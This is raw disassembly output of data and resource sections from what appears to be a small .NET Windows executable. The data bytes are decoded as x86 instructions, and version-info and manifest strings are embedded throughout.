  402e42:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  402e4a:	bound  esi,QWORD PTR ds:0x63363366
  402e50:	xor    eax,0x66653234
  402e55:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  402e5a:	data16 cmp BYTE PTR [eax],bh
  402e5d:	cmp    BYTE PTR ds:0x33643833,dh
  402e63:	aaa    
  402e64:	xor    al,0x63
  402e66:	xor    WORD PTR gs:[eax],si
  402e6a:	ss popa 
  402e6c:	arpl   WORD PTR [esi+0x37],sp
  402e6f:	cmp    DWORD PTR fs:[ebx],esi
  402e72:	popa   
  402e73:	xor    al,0x34
  402e75:	xor    al,0x35
  402e77:	arpl   WORD PTR [ebx],si
  402e79:	arpl   WORD PTR [edi],si
  402e7b:	xor    esp,DWORD PTR [ebx+0x64]
  402e7e:	cmp    DWORD PTR [ecx],esi
  402e80:	xor    DWORD PTR [esi+0x30],esp
  402e83:	xor    eax,0x61613137
  402e88:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  402e8d:	fs popa 
  402e8f:	xor    DWORD PTR [edx],esi
  402e91:	bound  esi,QWORD PTR [ecx]
  402e93:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  402e97:	arpl   WORD PTR [ebx],si
  402e99:	aaa    
  402e9a:	xor    eax,0x813362
  402e9f:	popa   
  402ea0:	xor    eax,0x36363861
  402ea5:	xor    DWORD PTR gs:[ebp+0x65],esp
  402ea9:	xor    DWORD PTR [eax],edi
  402eab:	data16 cmp BYTE PTR ss:[eax],dh
  402eaf:	aaa    
  402eb0:	ss cmp BYTE PTR ss:[edx],dh
  402eb4:	xor    BYTE PTR [ecx],bh
  402eb6:	xor    sp,WORD PTR [edx+0x31]
  402eba:	xor    DWORD PTR [edx],esi
  402ebc:	xor    esi,DWORD PTR [esi]
  402ebe:	popa   
  402ebf:	arpl   WORD PTR [ebp+0x35],sp
  402ec2:	xor    dh,BYTE PTR gs:[ecx]
  402ec5:	xor    WORD PTR [ecx],si
  402ec8:	aaa    
  402ec9:	cmp    BYTE PTR [eax],dh
  402ecb:	xor    esp,DWORD PTR [ecx+0x33]
  402ece:	xor    DWORD PTR [ebx+esi*1],esi
  402ed1:	popa   
  402ed2:	bound  esp,QWORD PTR [edx+0x31]
  402ed5:	xor    dh,BYTE PTR [esi]
  402ed7:	fs xor BYTE PTR fs:[ebx],dh
  402edb:	xor    eax,0x32643764
  402ee0:	data16 cmp BYTE PTR [edi],dh
  402ee3:	bound  esi,QWORD PTR ss:[esi]
  402ee6:	cmp    DWORD PTR [ebx],esi
  402ee8:	cmp    BYTE PTR [ecx+0x61],ah
  402eeb:	data16 xor ah,BYTE PTR [ebp+0x65]
  402eef:	xor    esi,DWORD PTR [ecx+esi*1]
  402ef2:	xor    al,0x64
  402ef4:	xor    eax,0x64303234
  402ef9:	aaa    
  402efa:	xor    eax,0x31323633
  402eff:	xor    al,0x30
  402f01:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  402f05:	xor    al,0x61
  402f07:	xor    al,0x39
  402f09:	arpl   WORD PTR [eax+edi*1],si
  402f0c:	arpl   WORD PTR ss:[ebp+0x31],sp
  402f10:	xor    esi,DWORD PTR [ebx+esi*1]
  402f13:	xor    BYTE PTR [eax],dh
  402f15:	popa   
  402f16:	xor    dh,BYTE PTR [ecx]
  402f18:	xor    BYTE PTR [esi],dh
  402f1a:	popa   
  402f1b:	bound  esi,QWORD PTR fs:[esi]
  402f1e:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  402f22:	xor    esi,DWORD PTR [ebx]
  402f24:	xor    eax,0x65663039
  402f29:	data16 cmp BYTE PTR [ecx+0x64],ah
  402f2d:	xor    eax,0x63333463
  402f32:	bound  esp,QWORD PTR [ecx+0x38]
  402f35:	xor    dh,BYTE PTR [edx]
  402f37:	cmp    DWORD PTR [eax],esi
  402f39:	arpl   WORD PTR fs:[ecx+edi*1],si
  402f3d:	xor    eax,0x66653033
  402f42:	data16 cmp BYTE PTR fs:[esi],dh
  402f46:	xor    eax,0x39643332
  402f4b:	xor    al,0x38
  402f4d:	xor    esp,DWORD PTR [ebx+0x30]
  402f50:	xor    BYTE PTR [esi+0x34],ah
  402f53:	xor    eax,0x34666138
  402f58:	cmp    BYTE PTR ss:[ecx],bh
  402f5b:	xor    BYTE PTR [eax],dh
  402f5d:	xor    esi,DWORD PTR [esi]
  402f5f:	bound  esi,QWORD PTR [eax]
  402f61:	xor    ah,BYTE PTR gs:[ebx+0x36]
  402f65:	xor    DWORD PTR [eax+esi*1+0x37],esp
  402f69:	aaa    
  402f6a:	fs aaa 
  402f6c:	bound  sp,DWORD PTR [ecx+0x63]
  402f70:	xor    al,0x36
  402f72:	aaa    
  402f73:	popa   
  402f74:	xor    eax,0x62653630
  402f79:	popa   
  402f7a:	xor    bh,BYTE PTR [ecx]
  402f7c:	gs xor al,0x36
  402f7f:	aaa    
  402f80:	popa   
  402f81:	cmp    BYTE PTR [edi],dh
  402f83:	xor    DWORD PTR [ecx],edi
  402f85:	cmp    BYTE PTR [edx+0x30],ah
  402f88:	xor    eax,0x34376333
  402f8d:	cmp    DWORD PTR [ecx+0x61],esp
  402f90:	xor    ah,BYTE PTR [ecx+0x34]
  402f93:	xor    bh,BYTE PTR fs:[eax]
  402f96:	xor    al,0x30
  402f98:	arpl   WORD PTR [edi],si
  402f9a:	cmp    BYTE PTR [eiz*2+0x6436],dh
  402fa1:	push   ds
  402fa2:	add    DWORD PTR [eax],eax
  402fa4:	add    DWORD PTR [eax],eax
  402fa6:	push   esp
  402fa7:	add    dl,BYTE PTR [esi]
  402fa9:	push   edi
  402faa:	jb     0x40300d
  402fac:	jo     0x402ffc
  402fae:	outs   dx,DWORD PTR ds:[esi]
  402faf:	outs   dx,BYTE PTR ds:[esi]
  402fb0:	inc    ebp
  402fb1:	js     0x403016
  402fb3:	gs jo  0x40302a
  402fb6:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  402fbd:	ja     0x403032
  402fbf:	add    DWORD PTR [eax],ecx
  402fc1:	add    DWORD PTR [eax],eax
  402fc3:	add    eax,DWORD PTR [eax]
  402fc5:	add    BYTE PTR [eax],al
  402fc7:	add    BYTE PTR [eax],al
  402fc9:	or     BYTE PTR [ecx],al
  402fcb:	add    BYTE PTR [eax],cl
	...
  402fd5:	add    BYTE PTR [eax],al
  402fd7:	add    ch,ah
  402fd9:	iret   
  402fda:	adc    DWORD PTR [eax+0x0],edx
  402fdd:	add    BYTE PTR [eax],al
  402fdf:	add    BYTE PTR [edx],al
  402fe1:	add    BYTE PTR [eax],al
  402fe3:	add    BYTE PTR [ecx+eax*1],bl
  402fe6:	add    BYTE PTR [eax],al
  402fe8:	lock das 
  402fea:	add    BYTE PTR [eax],al
  402fec:	lock adc DWORD PTR [eax],eax
  402fef:	add    BYTE PTR [edx+0x53],dl
  402ff2:	inc    esp
  402ff3:	push   ebx
  402ff4:	aad    0x5f
  402ff6:	add    eax,0x3746dc64
  402ffb:	inc    ebp
  402ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ffd:	add    dh,bh
  402fff:	shr    cl,cl
  403001:	inc    ecx
  403002:	sbb    DWORD PTR [ebx+0x1],ecx
  403008:	data16 cmp bl,BYTE PTR [edx+eiz*2+0x69]
  40300d:	outs   dx,BYTE PTR ds:[esi]
  40300e:	popa   
  40300f:	jb     0x40307a
  403011:	gs jae 0x403070
  403014:	dec    ecx
  403015:	outs   dx,BYTE PTR ds:[esi]
  403016:	je     0x40307d
  403018:	jb     0x403087
  40301a:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x646d5c65
  403023:	pop    sp
  403025:	je     0x40305b
  403027:	jbe    0x40309c
  403029:	push   0x7074736f
  40302e:	jb     0x40309f
  403030:	arpl   WORD PTR [ebp+0x73],sp
  403033:	jae    0x403063
  403035:	arpl   WORD PTR [ebx+0x70],si
  403038:	jb     0x4030a9
  40303a:	push   0x5f
  40303c:	xor    DWORD PTR [eax],esi
  40303e:	xor    eax,0x31373838
  403043:	xor    bh,BYTE PTR [eax]
  403045:	xor    ebx,DWORD PTR [edi+ebp*2+0x62]
  403049:	push   0x72
  40304b:	pop    esp
  40304c:	js     0x403086
  40304e:	ss pop esp
  403050:	push   esp
  403051:	xor    al,0x56
  403053:	push   ebx
  403054:	dec    eax
  403055:	outs   dx,DWORD PTR ds:[esi]
  403056:	jae    0x4030cc
  403058:	push   eax
  403059:	jb     0x4030ca
  40305b:	arpl   WORD PTR [ebp+0x73],sp
  40305e:	jae    0x40308e
  403060:	jo     0x4030c6
  403062:	bound  eax,QWORD PTR [eax]
	...
  40310c:	xor    al,0x31
	...
  403116:	add    BYTE PTR [eax],al
  403118:	dec    esi
  403119:	xor    DWORD PTR [eax],eax
  40311b:	add    BYTE PTR [eax],al
  40311d:	and    BYTE PTR [eax],al
	...
  403133:	add    BYTE PTR [eax+0x31],al
	...
  403142:	pop    edi
  403143:	inc    ebx
  403144:	outs   dx,DWORD PTR ds:[esi]
  403145:	jb     0x40318c
  403147:	js     0x4031ae
  403149:	dec    ebp
  40314a:	popa   
  40314b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  403152:	jb     0x4031b9
  403154:	gs cs fs ins BYTE PTR es:[edi],dx
  403158:	ins    BYTE PTR es:[edi],dx
  403159:	add    BYTE PTR [eax],al
  40315b:	add    BYTE PTR [eax],al
  40315d:	add    bh,bh
  40315f:	and    eax,0x402000

Disassembly of section .rsrc:

00404000 <.rsrc>:
	...
  40400c:	add    BYTE PTR [eax],al
  40400e:	add    al,BYTE PTR [eax]
  404010:	adc    BYTE PTR [eax],al
  404012:	add    BYTE PTR [eax],al
  404014:	and    BYTE PTR [eax],al
  404016:	add    BYTE PTR [eax+0x18],al
  40401c:	cmp    BYTE PTR [eax],al
  40401e:	add    BYTE PTR [eax+0x0],al
	...
  40402c:	add    BYTE PTR [eax],al
  40402e:	add    DWORD PTR [eax],eax
  404030:	add    DWORD PTR [eax],eax
  404032:	add    BYTE PTR [eax],al
  404034:	push   eax
  404035:	add    BYTE PTR [eax],al
  404037:	add    BYTE PTR [eax],0x0
	...
  404046:	add    DWORD PTR [eax],eax
  404048:	add    DWORD PTR [eax],eax
  40404a:	add    BYTE PTR [eax],al
  40404c:	push   0x800000
	...
  40405d:	add    BYTE PTR [ecx],al
  40405f:	add    BYTE PTR [eax],al
  404061:	add    BYTE PTR [eax],al
  404063:	add    BYTE PTR [eax+0x0],al
	...
  404075:	add    BYTE PTR [ecx],al
  404077:	add    BYTE PTR [eax],al
  404079:	add    BYTE PTR [eax],al
  40407b:	add    BYTE PTR [eax-0x60000000],dl
  404081:	inc    eax
  404082:	add    BYTE PTR [eax],al
  404084:	call   0x40408c
  404089:	add    BYTE PTR [eax],al
  40408b:	add    BYTE PTR [eax],al
  40408d:	add    BYTE PTR [eax],al
  40408f:	add    BYTE PTR [eax-0x15ffffbc],cl
  404095:	add    DWORD PTR [eax],eax
	...
  40409f:	add    al,ch
  4040a1:	add    esi,DWORD PTR [eax+eax*1]
  4040a4:	add    BYTE PTR [eax],al
  4040a6:	push   esi
  4040a7:	add    BYTE PTR [ebx+0x0],dl
  4040aa:	pop    edi
  4040ab:	add    BYTE PTR [esi+0x0],dl
  4040ae:	inc    ebp
  4040af:	add    BYTE PTR [edx+0x0],dl
  4040b2:	push   ebx
  4040b3:	add    BYTE PTR [ecx+0x0],cl
  4040b6:	dec    edi
  4040b7:	add    BYTE PTR [esi+0x0],cl
  4040ba:	pop    edi
  4040bb:	add    BYTE PTR [ecx+0x0],cl
  4040be:	dec    esi
  4040bf:	add    BYTE PTR [esi+0x0],al
  4040c2:	dec    edi
  4040c3:	add    BYTE PTR [eax],al
  4040c5:	add    BYTE PTR [eax],al
  4040c7:	add    BYTE PTR [ebp+0xfeef04],bh
  4040cd:	add    BYTE PTR [ecx],al
  4040cf:	add    BYTE PTR [eax],al
  4040d1:	add    BYTE PTR [ebx],cl
  4040d3:	add    BYTE PTR [ecx],al
  4040d5:	add    BYTE PTR [edi],ah
  4040d7:	mov    BYTE PTR [eax],0x0
  4040da:	or     eax,DWORD PTR [eax]
  4040dc:	add    DWORD PTR [eax],eax
  4040de:	daa    
  4040df:	(bad)  
  4040e0:	aas    
  4040e1:	add    BYTE PTR [eax],al
  4040e3:	add    BYTE PTR [eax],al
  4040e5:	add    BYTE PTR [eax],al
  4040e7:	add    BYTE PTR [eax+eax*1],al
  4040ea:	add    BYTE PTR [eax],al
  4040ec:	add    DWORD PTR [eax],eax
	...
  4040fa:	add    BYTE PTR [eax],al
  4040fc:	inc    esp
  4040fd:	add    BYTE PTR [eax],al
  4040ff:	add    BYTE PTR [ecx],al
  404101:	add    BYTE PTR [esi+0x0],dl
  404104:	popa   
  404105:	add    BYTE PTR [edx+0x0],dh
  404108:	inc    esi
  404109:	add    BYTE PTR [ecx+0x0],ch
  40410c:	ins    BYTE PTR es:[edi],dx
  40410d:	add    BYTE PTR [ebp+0x0],ah
  404110:	dec    ecx
  404111:	add    BYTE PTR [esi+0x0],ch
  404114:	data16 add BYTE PTR [edi+0x0],ch
  404118:	add    BYTE PTR [eax],al
  40411a:	add    BYTE PTR [eax],al
  40411c:	and    al,0x0
  40411e:	add    al,0x0
  404120:	add    BYTE PTR [eax],al
  404122:	push   esp
  404123:	add    BYTE PTR [edx+0x0],dh
  404126:	popa   
  404127:	add    BYTE PTR [esi+0x0],ch
  40412a:	jae    0x40412c
  40412c:	ins    BYTE PTR es:[edi],dx
  40412d:	add    BYTE PTR [ecx+0x0],ah
  404130:	je     0x404132
  404132:	imul   eax,DWORD PTR [eax],0x6e006f
  404138:	add    BYTE PTR [eax],al
  40413a:	add    BYTE PTR [eax],al
  40413c:	add    BYTE PTR [eax],al
  40413e:	mov    al,0x4
  404140:	dec    eax
  404141:	add    eax,DWORD PTR [eax]
  404143:	add    BYTE PTR [ecx],al
  404145:	add    BYTE PTR [ebx+0x0],dl
  404148:	je     0x40414a
  40414a:	jb     0x40414c
  40414c:	imul   eax,DWORD PTR [eax],0x67006e
  404152:	inc    esi
  404153:	add    BYTE PTR [ecx+0x0],ch
  404156:	ins    BYTE PTR es:[edi],dx
  404157:	add    BYTE PTR [ebp+0x0],ah
  40415a:	dec    ecx
  40415b:	add    BYTE PTR [esi+0x0],ch
  40415e:	data16 add BYTE PTR [edi+0x0],ch
  404162:	add    BYTE PTR [eax],al
  404164:	and    al,0x3
  404166:	add    BYTE PTR [eax],al
  404168:	add    DWORD PTR [eax],eax
  40416a:	xor    BYTE PTR [eax],al
  40416c:	xor    BYTE PTR [eax],al
  40416e:	xor    BYTE PTR [eax],al
  404170:	xor    BYTE PTR [eax],al
  404172:	xor    BYTE PTR [eax],al
  404174:	xor    al,0x0
  404176:	bound  eax,QWORD PTR [eax]
  404178:	xor    BYTE PTR [eax],al
  40417a:	add    BYTE PTR [eax],al
  40417c:	inc    eax
  40417d:	add    BYTE PTR [eax+eax*1],dl
  404180:	add    DWORD PTR [eax],eax
  404182:	inc    ebx
  404183:	add    BYTE PTR [edi+0x0],ch
  404186:	ins    DWORD PTR es:[edi],dx
  404187:	add    BYTE PTR [ebp+0x0],ch
  40418a:	add    BYTE PTR gs:[esi+0x0],ch
  40418e:	je     0x404190
  404190:	jae    0x404192
  404192:	add    BYTE PTR [eax],al
  404194:	push   esp
  404195:	add    BYTE PTR [eax+eax*1],dh
  404198:	push   esi
  404199:	add    BYTE PTR [ebx+0x0],dl
  40419c:	dec    eax
  40419d:	add    BYTE PTR [edi+0x0],ch
  4041a0:	jae    0x4041a2
  4041a2:	je     0x4041a4
  4041a4:	push   eax
  4041a5:	add    BYTE PTR [edx+0x0],dh
  4041a8:	outs   dx,DWORD PTR ds:[esi]
  4041a9:	add    BYTE PTR [ebx+0x0],ah
  4041ac:	add    BYTE PTR gs:[ebx+0x0],dh
  4041b0:	jae    0x4041b2
  4041b2:	add    BYTE PTR cs:[ebp+0x0],ah
  4041b6:	js     0x4041b8
  4041b8:	add    BYTE PTR gs:[eax],al
  4041bb:	add    BYTE PTR [eax+eax*1+0x16],cl
  4041bf:	add    BYTE PTR [ecx],al
  4041c1:	add    BYTE PTR [ebx+0x0],al
  4041c4:	outs   dx,DWORD PTR ds:[esi]
  4041c5:	add    BYTE PTR [ebp+0x0],ch
  4041c8:	jo     0x4041ca
  4041ca:	popa   
  4041cb:	add    BYTE PTR [esi+0x0],ch
  4041ce:	jns    0x4041d0
  4041d0:	dec    esi
  4041d1:	add    BYTE PTR [ecx+0x0],ah
  4041d4:	ins    DWORD PTR es:[edi],dx
  4041d5:	add    BYTE PTR [ebp+0x0],ah
  4041d8:	add    BYTE PTR [eax],al
  4041da:	add    BYTE PTR [eax],al
  4041dc:	dec    ebp
  4041dd:	add    BYTE PTR [ecx+0x0],ch
  4041e0:	arpl   WORD PTR [eax],ax
  4041e2:	jb     0x4041e4
  4041e4:	outs   dx,DWORD PTR ds:[esi]
  4041e5:	add    BYTE PTR [ebx+0x0],dh
  4041e8:	outs   dx,DWORD PTR ds:[esi]
  4041e9:	add    BYTE PTR [esi+0x0],ah
  4041ec:	je     0x4041ee
  4041ee:	and    BYTE PTR [eax],al
  4041f0:	inc    ebx
  4041f1:	add    BYTE PTR [edi+0x0],ch
  4041f4:	jb     0x4041f6
  4041f6:	jo     0x4041f8
  4041f8:	outs   dx,DWORD PTR ds:[esi]
  4041f9:	add    BYTE PTR [edx+0x0],dh
  4041fc:	popa   
  4041fd:	add    BYTE PTR [eax+eax*1+0x69],dh
  404201:	add    BYTE PTR [edi+0x0],ch
  404204:	outs   dx,BYTE PTR ds:[esi]
  404205:	add    BYTE PTR [eax],al
  404207:	add    BYTE PTR [eax+0x0],dl
  40420a:	adc    al,0x0
  40420c:	add    DWORD PTR [eax],eax
  40420e:	inc    esi
  40420f:	add    BYTE PTR [ecx+0x0],ch
  404212:	ins    BYTE PTR es:[edi],dx
  404213:	add    BYTE PTR [ebp+0x0],ah
  404216:	inc    esp
  404217:	add    BYTE PTR [ebp+0x0],ah
  40421a:	jae    0x40421c
  40421c:	arpl   WORD PTR [eax],ax
  40421e:	jb     0x404220
  404220:	imul   eax,DWORD PTR [eax],0x740070
  404226:	imul   eax,DWORD PTR [eax],0x6e006f
  40422c:	add    BYTE PTR [eax],al
  40422e:	add    BYTE PTR [eax],al
  404230:	push   esp
  404231:	add    BYTE PTR [eax+eax*1],dh
  404234:	push   esi
  404235:	add    BYTE PTR [ebx+0x0],dl
  404238:	dec    eax
  404239:	add    BYTE PTR [edi+0x0],ch
  40423c:	jae    0x40423e
  40423e:	je     0x404240
  404240:	push   eax
  404241:	add    BYTE PTR [edx+0x0],dh
  404244:	outs   dx,DWORD PTR ds:[esi]
  404245:	add    BYTE PTR [ebx+0x0],ah
  404248:	add    BYTE PTR gs:[ebx+0x0],dh
  40424c:	jae    0x40424e
  40424e:	add    BYTE PTR cs:[ebp+0x0],ah
  404252:	js     0x404254
  404254:	add    BYTE PTR gs:[eax],al
  404257:	add    BYTE PTR [eax+eax*1],bh
  40425a:	or     eax,0x46000100
  40425f:	add    BYTE PTR [ecx+0x0],ch
  404262:	ins    BYTE PTR es:[edi],dx
  404263:	add    BYTE PTR [ebp+0x0],ah
  404266:	push   esi
  404267:	add    BYTE PTR [ebp+0x0],ah
  40426a:	jb     0x40426c
  40426c:	jae    0x40426e
  40426e:	imul   eax,DWORD PTR [eax],0x6e006f
  404274:	add    BYTE PTR [eax],al
  404276:	add    BYTE PTR [eax],al
  404278:	xor    DWORD PTR [eax],eax
  40427a:	xor    DWORD PTR [eax],eax
  40427c:	add    BYTE PTR cs:[eax],dh
  40427f:	add    BYTE PTR [esi],ch
  404281:	add    BYTE PTR ds:0x37003000,dh
  404287:	add    BYTE PTR [edx],dh
  404289:	add    BYTE PTR [edi],dh
  40428b:	add    BYTE PTR [esi],ch
  40428d:	add    BYTE PTR [ecx],dh
  40428f:	add    BYTE PTR [eax],al
  404291:	add    BYTE PTR [eax],al
  404293:	add    BYTE PTR [eax+0x0],cl
  404296:	adc    al,0x0
  404298:	add    DWORD PTR [eax],eax
  40429a:	dec    ecx
  40429b:	add    BYTE PTR [esi+0x0],ch
  40429e:	je     0x4042a0
  4042a0:	add    BYTE PTR gs:[edx+0x0],dh
  4042a4:	outs   dx,BYTE PTR ds:[esi]
  4042a5:	add    BYTE PTR [ecx+0x0],ah
  4042a8:	ins    BYTE PTR es:[edi],dx
  4042a9:	add    BYTE PTR [esi+0x0],cl
  4042ac:	popa   
  4042ad:	add    BYTE PTR [ebp+0x0],ch
  4042b0:	add    BYTE PTR gs:[eax],al
  4042b3:	add    BYTE PTR [eax+eax*1+0x34],dl
  4042b7:	add    BYTE PTR [esi+0x0],dl
  4042ba:	push   ebx
  4042bb:	add    BYTE PTR [eax+0x0],cl
  4042be:	outs   dx,DWORD PTR ds:[esi]
  4042bf:	add    BYTE PTR [ebx+0x0],dh
  4042c2:	je     0x4042c4
  4042c4:	push   eax
  4042c5:	add    BYTE PTR [edx+0x0],dh
  4042c8:	outs   dx,DWORD PTR ds:[esi]
  4042c9:	add    BYTE PTR [ebx+0x0],ah
  4042cc:	add    BYTE PTR gs:[ebx+0x0],dh
  4042d0:	jae    0x4042d2
  4042d2:	add    BYTE PTR cs:[ebp+0x0],ah
  4042d6:	js     0x4042d8
  4042d8:	add    BYTE PTR gs:[eax],al
  4042db:	add    BYTE PTR [eax+0x1002e00],al
  4042e1:	add    BYTE PTR [eax+eax*1+0x65],cl
  4042e5:	add    BYTE PTR [edi+0x0],ah
  4042e8:	popa   
  4042e9:	add    BYTE PTR [eax+eax*1+0x43],ch
  4042ed:	add    BYTE PTR [edi+0x0],ch
  4042f0:	jo     0x4042f2
  4042f2:	jns    0x4042f4
  4042f4:	jb     0x4042f6
  4042f6:	imul   eax,DWORD PTR [eax],0x680067
  4042fc:	je     0x4042fe
  4042fe:	add    BYTE PTR [eax],al
  404300:	test   eax,0x4d002000
  404305:	add    BYTE PTR [ecx+0x0],ch
  404308:	arpl   WORD PTR [eax],ax
  40430a:	jb     0x40430c
  40430c:	outs   dx,DWORD PTR ds:[esi]
  40430d:	add    BYTE PTR [ebx+0x0],dh
  404310:	outs   dx,DWORD PTR ds:[esi]
  404311:	add    BYTE PTR [esi+0x0],ah
  404314:	je     0x404316
  404316:	and    BYTE PTR [eax],al
  404318:	inc    ebx
  404319:	add    BYTE PTR [edi+0x0],ch
  40431c:	jb     0x40431e
  40431e:	jo     0x404320
  404320:	outs   dx,DWORD PTR ds:[esi]
  404321:	add    BYTE PTR [edx+0x0],dh
  404324:	popa   
  404325:	add    BYTE PTR [eax+eax*1+0x69],dh
  404329:	add    BYTE PTR [edi+0x0],ch
  40432c:	outs   dx,BYTE PTR ds:[esi]
  40432d:	add    BYTE PTR [esi],ch
  40432f:	add    BYTE PTR [eax],ah
  404331:	add    BYTE PTR [ecx+0x0],al
  404334:	ins    BYTE PTR es:[edi],dx
  404335:	add    BYTE PTR [eax+eax*1+0x20],ch
  404339:	add    BYTE PTR [edx+0x0],dh
  40433c:	imul   eax,DWORD PTR [eax],0x680067
  404342:	je     0x404344
  404344:	jae    0x404346
  404346:	and    BYTE PTR [eax],al
  404348:	jb     0x40434a
  40434a:	add    BYTE PTR gs:[ebx+0x0],dh
  40434e:	add    BYTE PTR gs:[edx+0x0],dh
  404352:	jbe    0x404354
  404354:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  404359:	add    BYTE PTR [eax],al
  40435b:	add    BYTE PTR [eax+0x0],dl
  40435e:	adc    al,0x0
  404360:	add    DWORD PTR [eax],eax
  404362:	dec    edi
  404363:	add    BYTE PTR [edx+0x0],dh
  404366:	imul   eax,DWORD PTR [eax],0x690067
  40436c:	outs   dx,BYTE PTR ds:[esi]
  40436d:	add    BYTE PTR [ecx+0x0],ah
  404370:	ins    BYTE PTR es:[edi],dx
  404371:	add    BYTE PTR [esi+0x0],al
  404374:	imul   eax,DWORD PTR [eax],0x65006c
  40437a:	outs   dx,BYTE PTR ds:[esi]
  40437b:	add    BYTE PTR [ecx+0x0],ah
  40437e:	ins    DWORD PTR es:[edi],dx
  40437f:	add    BYTE PTR [ebp+0x0],ah
  404382:	add    BYTE PTR [eax],al
  404384:	push   esp
  404385:	add    BYTE PTR [eax+eax*1],dh
  404388:	push   esi
  404389:	add    BYTE PTR [ebx+0x0],dl
  40438c:	dec    eax
  40438d:	add    BYTE PTR [edi+0x0],ch
  404390:	jae    0x404392
  404392:	je     0x404394
  404394:	push   eax
  404395:	add    BYTE PTR [edx+0x0],dh
  404398:	outs   dx,DWORD PTR ds:[esi]
  404399:	add    BYTE PTR [ebx+0x0],ah
  40439c:	add    BYTE PTR gs:[ebx+0x0],dh
  4043a0:	jae    0x4043a2
  4043a2:	add    BYTE PTR cs:[ebp+0x0],ah
  4043a6:	js     0x4043a8
  4043a8:	add    BYTE PTR gs:[eax],al
  4043ab:	add    BYTE PTR [eax+0x0],ah
  4043ae:	pop    ds
  4043af:	add    BYTE PTR [ecx],al
  4043b1:	add    BYTE PTR [eax+0x0],dl
  4043b4:	jb     0x4043b6
  4043b6:	outs   dx,DWORD PTR ds:[esi]
  4043b7:	add    BYTE PTR [eax+eax*1+0x75],ah
  4043bb:	add    BYTE PTR [ebx+0x0],ah
  4043be:	je     0x4043c0
  4043c0:	dec    esi
  4043c1:	add    BYTE PTR [ecx+0x0],ah
  4043c4:	ins    DWORD PTR es:[edi],dx
  4043c5:	add    BYTE PTR [ebp+0x0],ah
  4043c8:	add    BYTE PTR [eax],al
  4043ca:	add    BYTE PTR [eax],al
  4043cc:	dec    ebp
  4043cd:	add    BYTE PTR [ecx+0x0],ch
  4043d0:	arpl   WORD PTR [eax],ax
  4043d2:	jb     0x4043d4
  4043d4:	outs   dx,DWORD PTR ds:[esi]
  4043d5:	add    BYTE PTR [ebx+0x0],dh
  4043d8:	outs   dx,DWORD PTR ds:[esi]
  4043d9:	add    BYTE PTR [esi+0x0],ah
  4043dc:	je     0x4043de
  4043de:	scas   al,BYTE PTR es:[edi]
  4043df:	add    BYTE PTR [eax],ah
  4043e1:	add    BYTE PTR [esi+0x0],dl
  4043e4:	imul   eax,DWORD PTR [eax],0x750073
  4043ea:	popa   
  4043eb:	add    BYTE PTR [eax+eax*1+0x20],ch
  4043ef:	add    BYTE PTR [ebx+0x0],dl
  4043f2:	je     0x4043f4
  4043f4:	jne    0x4043f6
  4043f6:	add    BYTE PTR fs:[ecx+0x0],ch
  4043fa:	outs   dx,DWORD PTR ds:[esi]
  4043fb:	add    BYTE PTR [esi+0x32002000],ch
  404401:	add    BYTE PTR [eax],dh
  404403:	add    BYTE PTR [ecx],dh
  404405:	add    BYTE PTR [edx],dh
  404407:	add    BYTE PTR [eax],al
  404409:	add    BYTE PTR [eax],al
  40440b:	add    BYTE PTR [eax+0x0],al
  40440e:	or     eax,0x50000100
  404413:	add    BYTE PTR [edx+0x0],dh
  404416:	outs   dx,DWORD PTR ds:[esi]
  404417:	add    BYTE PTR [eax+eax*1+0x75],ah
  40441b:	add    BYTE PTR [ebx+0x0],ah
  40441e:	je     0x404420
  404420:	push   esi
  404421:	add    BYTE PTR [ebp+0x0],ah
  404424:	jb     0x404426
  404426:	jae    0x404428
  404428:	imul   eax,DWORD PTR [eax],0x6e006f
  40442e:	add    BYTE PTR [eax],al
  404430:	xor    DWORD PTR [eax],eax
  404432:	xor    DWORD PTR [eax],eax
  404434:	add    BYTE PTR cs:[eax],dh
  404437:	add    BYTE PTR [esi],ch
  404439:	add    BYTE PTR ds:0x37003000,dh
  40443f:	add    BYTE PTR [edx],dh
  404441:	add    BYTE PTR [edi],dh
  404443:	add    BYTE PTR [esi],ch
  404445:	add    BYTE PTR [ecx],dh
  404447:	add    BYTE PTR [eax],al
  404449:	add    BYTE PTR [eax],al
  40444b:	add    BYTE PTR [eax+eax*1],bh
  40444e:	or     DWORD PTR [eax],eax
  404450:	add    DWORD PTR [eax],eax
  404452:	inc    ecx
  404453:	add    BYTE PTR [ebx+0x0],dh
  404456:	jae    0x404458
  404458:	add    BYTE PTR gs:[ebp+0x0],ch
  40445c:	bound  eax,QWORD PTR [eax]
  40445e:	ins    BYTE PTR es:[edi],dx
  40445f:	add    BYTE PTR [ecx+0x0],bh
  404462:	and    BYTE PTR [eax],al
  404464:	push   esi
  404465:	add    BYTE PTR [ebp+0x0],ah
  404468:	jb     0x40446a
  40446a:	jae    0x40446c
  40446c:	imul   eax,DWORD PTR [eax],0x6e006f
  404472:	add    BYTE PTR [eax],al
  404474:	xor    DWORD PTR [eax],eax
  404476:	xor    DWORD PTR [eax],eax
  404478:	add    BYTE PTR cs:[eax],dh
  40447b:	add    BYTE PTR [esi],ch
  40447d:	add    BYTE PTR [eax],dh
  40447f:	add    BYTE PTR [esi],ch
  404481:	add    BYTE PTR [eax],dh
  404483:	add    BYTE PTR [eax],al
  404485:	add    BYTE PTR [eax],al
  404487:	add    bh,ch
  404489:	mov    ebx,0x783f3cbf
  40448e:	ins    DWORD PTR es:[edi],dx
  40448f:	ins    BYTE PTR es:[edi],dx
  404490:	and    BYTE PTR [esi+0x65],dh
  404493:	jb     0x404508
  404495:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40449c:	xor    BYTE PTR [edx],ah
  40449e:	and    BYTE PTR [ebp+0x6e],ah
  4044a1:	arpl   WORD PTR [edi+0x64],bp
  4044a4:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  4044ab:	inc    esi
  4044ac:	sub    eax,0x73202238
  4044b1:	je     0x404514
  4044b3:	outs   dx,BYTE PTR ds:[esi]
  4044b4:	fs popa 
  4044b6:	ins    BYTE PTR es:[edi],dx
